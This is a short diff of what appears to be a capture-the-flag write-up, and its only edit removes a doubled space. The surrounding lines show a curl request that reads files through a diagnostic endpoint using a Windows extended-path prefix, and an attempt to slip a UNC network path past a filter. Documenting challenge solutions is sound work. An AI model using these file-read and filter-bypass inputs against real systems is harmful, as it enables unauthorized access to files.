@@ -38,7 +38,7 @@ $ curl -sG "http://1.95.51.2:8080/api/diag/read" --data-urlencode 'path=\\?\C:\t
 {"message":"Access key verified! Here is your Stage 2 token.","success":true,"token":"SlR9QZfR3Jhxc7ONiW5mkDXtXf-DlyOyJSzX3Inu6cM","token_expires_in":300}
 ```
 
-Stage2 requires to network access. I thought to use UNC path like `//./UNC/172.20.0.10/backup/flag.txt` but filter rejects with  "UNC path not allowed" error.
+Stage2 requires to network access. I thought to use UNC path like `//./UNC/172.20.0.10/backup/flag.txt` but filter rejects with "UNC path not allowed" error.
 
 Finally, my teammate solved stage2.
 ```sh
